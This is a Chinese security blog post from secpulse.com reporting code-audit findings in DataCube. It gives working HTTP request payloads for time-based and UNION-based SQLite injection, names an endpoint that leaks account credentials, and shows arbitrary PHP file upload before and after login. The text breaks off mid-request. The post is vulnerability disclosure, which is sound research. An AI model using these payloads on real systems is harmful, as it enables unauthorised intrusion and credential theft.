---
title: DataCube 漏洞小结
url: https://www.secpulse.com/archives/205081.html
source: 安全脉搏
date: 2025-01-17
fetch_date: 2025-10-06T20:08:25.999717
---

# DataCube 漏洞小结

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# DataCube 漏洞小结

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-01-16

17,648

在这里分享一下通过拖取 DataCube 代码审计后发现的一些漏洞，包括前台的文件上传，信息泄露出账号密码，后台的文件上传。当然还有部分 SQL 注入漏洞，因为 DataCube 采用的是 SQLite 的数据库，所以SQL 注入相对来说显得就很鸡肋。当然可能还有没有发现的漏洞，可以互相讨论。

## phpinfo 泄露

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536552.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536553.png)

## SQL注入

### 无回显的SQL注入

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536554.png)

/DataCube/www/admin/setting\_schedule.php

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536555.png)

SQLite 没有sleep()函数，但是可以用 randomblob(N) 来制造延时。randomblob(N)函数是SQLite数据库中的一个常用函数，它的作用是生成一个指定长度的随机二进制字符串。

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536556.png)

正常请求时间

```
POST /admin/setting_schedule.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close

datetime=2024-04-24+02%3A00'+or+randomblob(9000000000000000000000000)+and+'1&tbl_type=fs&delete=1
```

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536557.png)

延时响应

判断对应的 SQLite 的版本号

```
POST /admin/setting_schedule.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

datetime=-1'or+(case+when(substr(sqlite_version(),1,1)<'4')+then+randomblob(900000000000000000000000000)+else+0+end)+and+'1&tbl_type=fs&delete=1
```

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536558.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536559.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536560.png)

可以判断出SQLite的版本是3

### 有回显的SQL注入

```
POST /admin/pr_monitor/getting_index_data.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

req_id=1) UNION ALL SELECT sqlite_version(),NULL,NULL--
```

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536561.png)

查询出 sqlite 的版本号

www\admin\pr\_monitor\getting\_index\_data.php

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536562.png)

www\admin\pr\_monitor\getting\_screen\_data.php#getData

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536563.png)

www\admin\pr\_monitor\getting\_screen\_data.php#getMonitorItemList

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536564.png)

## 信息泄露

www\admin\config\_all.php

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536565.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536566.png)

将从 SQLite3 数据库中获取的数据转换为一个 JSON 字符串，并输出在页面上

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536568.png)

## 任意文件上传

www\admin\transceiver\_schedule.php

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536569.png)

```
POST /admin/transceiver_schedule.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryb8tU2iptV70lGozq
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryb8tU2iptV70lGozq
Content-Disposition: form-data; name="upload_file"; filename="test1.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
------WebKitFormBoundaryb8tU2iptV70lGozq
Content-Disposition: form-data; name="usb_schedule"

1
------WebKitFormBoundaryb8tU2iptV70lGozq--
```

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536570.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536571.png)

## 后台任意文件上传

www\admin\setting\_photo.php

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536572.png)

www\admin\setting\_photo.php#insertPhoto

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536573.png)

www\admin\images.php

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536574.png)

登录后获取参数 accesstime 的值

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202405291536575.png)

将值替换到数据包中

```
POST /admin/setting_photo.php HTTP/1.1
Content-Length: 414
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydzDlRcTHEmG3mohY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*...